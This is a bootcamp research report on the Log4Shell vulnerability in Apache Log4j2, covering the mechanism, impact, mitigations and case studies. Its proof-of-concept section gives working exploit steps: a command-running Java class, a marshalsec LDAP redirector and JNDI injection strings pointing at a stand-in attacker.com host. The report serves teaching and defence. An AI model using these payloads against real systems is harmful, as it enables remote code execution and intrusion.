# log4j-report
A report for my bootcamp.
📈 CVE-2021-44228 (Log4Shell) - Vulnerability Research Report

Author: Alex Breger
Date: April 2025
Tags: Apache, Log4j, JNDI, LDAP, RCE, CVE, Exploit, MITRE ATT&CK

⸻

🔍 Executive Summary
	•	CVE: CVE-2021-44228
	•	Discovered: December 2021
	•	Affected Software: Apache Log4j2 (2.0-beta9 to 2.14.1)
	•	Impact: Remote Code Execution (RCE)
	•	Vector: JNDI Lookup injection via LDAP
	•	Severity: Critical (CVSS Score: 10.0)

The vulnerability known as Log4Shell resides in Apache Log4j2 and enables attackers to perform Remote Code Execution by leveraging the JNDI Lookup feature embedded within log message resolution logic. When user-controlled data is logged, it may include malicious JNDI lookups such as ${jndi:ldap://attacker.com/payload}, which Log4j resolves, triggering a remote class load and execution.

⸻

🔪 Technical Description

Nature of the Vulnerability

Log4j2 improperly processes embedded variables using JNDI lookups. Attackers can inject expressions like ${jndi:ldap://...} into log messages, tricking the logger into reaching out to attacker-controlled directories and deserializing remote classes.

Key Mechanism:
	•	JNDI (Java Naming and Directory Interface) allows resolution of external resources
	•	Log4j2 supports recursive evaluation of input data
	•	Result: Arbitrary code fetched from attacker server is loaded and executed

Exploitation Vector
	1.	Attacker sends a malicious input to the system (e.g., HTTP header, form field, user agent):

User-Agent: ${jndi:ldap://attacker.com/exploit}


	2.	Log4j logs the string, triggering JNDI lookup
	3.	Lookup contacts LDAP server controlled by attacker
	4.	LDAP server responds with remote Java class reference
	5.	The vulnerable application loads and executes the remote class, leading to RCE

⸻

📈 Affected Systems
	•	Log4j Versions: 2.0-beta9 through 2.14.1
	•	Patched in: 2.15.0 (JNDI disabled by default), removed entirely in 2.16.0+
	•	Vendors Impacted: Virtually all major Java-based software stacks (e.g., Apache, Minecraft, VMware, Elastic, AWS services, etc.)

⸻

🔦 MITRE ATT&CK Mapping

Tactic	Technique Description	ID
Initial Access	Exploit Application Vulnerability	T1190
Execution	Remote Java Class Execution via JNDI	T1059.005
Command and Control	External Remote Service (LDAP/HTTP)	T1071.001



⸻

⚖️ Impact

🚀 Remote Code Execution (RCE)
	•	Arbitrary attacker code is executed within the JVM of the vulnerable application

🔐 Full System Compromise
	•	If the app runs as root or privileged service, full machine compromise is possible

📈 Data Exfiltration
	•	Access to sensitive logs, credentials, tokens, customer data

🤧 Lateral Movement
	•	Compromised system may be used as a launchpad to pivot internally

⛔ Denial of Service / Persistence
	•	Malware, ransomware, or persistent access can be established

⸻

⚜️ Real-World Exploits & Responses
	•	CISA: Issued emergency directive urging immediate patching across federal systems
	•	SANS Institute: Documented exploitation in retail sector involving exfiltration and malware
	•	GitHub: Reviewed 35,000+ dependencies and rapidly patched repositories
	•	AWS: Rolled out proactive mitigations across customer services
	•	Nation-State Actors: APTs and ransomware groups exploited the vulnerability at scale

⸻

🪜 Mitigation and Remediation

✅ Recommended Actions
	1.	Upgrade Log4j2 to ≥ 2.16.0
	2.	Remove JndiLookup class:

zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class


	3.	Disable JNDI Lookup in configurations:

-Dlog4j2.formatMsgNoLookups=true


	4.	Use Web Application Firewalls (WAFs) to block known payload patterns
	5.	Restrict outbound LDAP/DNS access in egress firewall rules
	6.	Monitor Logs for Indicators of Compromise (IOCs)

⌚ Long-Term Recommendations
	•	Harden JVM runtime
	•	Perform dependency audits (SBOMs)
	•	Implement centralized logging + anomaly detection
	•	Train developers to avoid logging unsanitized input

⸻

📊 Case Studies

1. Retail Company (SANS)

Attackers used Log4Shell to exfiltrate credit card data, later leading to a ransomware drop.

2. GitHub Response

35,000+ codebases were scanned and upgraded within 72 hours to ensure zero exposure.

3. AWS

AWS released automated scanning and blocked outbound JNDI-based exploits across EC2, Lambda, etc.

⸻

🧪 High-Level Proof of Concept (PoC)

For educational purposes only

Step 1: Craft malicious Java class

public class Exploit {
    static {
        Runtime.getRuntime().exec("touch /tmp/pwned");
    }
}

Step 2: Host class file over HTTP

python3 -m http.server 8000

Step 3: Setup LDAP server to redirect to payload

Use marshalsec tool to setup malicious LDAP redirector

java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8000/#Exploit

Step 4: Trigger the exploit

Send malicious input to vulnerable app:

User-Agent: ${jndi:ldap://attacker.com:1389/Exploit}

Step 5: Observe RCE
	•	Confirm touch /tmp/pwned executed on target
	•	Log and alert on outbound JNDI calls

⸻

🔧 References
	•	CVE-2021-44228 NVD
	•	Apache Log4j Security Advisory
	•	GitHub’s Response
	•	SANS Log4Shell Resources
	•	CISA Log4Shell Mitigation Guidance
	•	marshalsec GitHub

⸻

💪 License

MIT License © 2025 Alex Breger

⸻

⚠️ DISCLAIMER

This content is for educational and ethical research purposes only. Do not exploit systems without proper authorization.
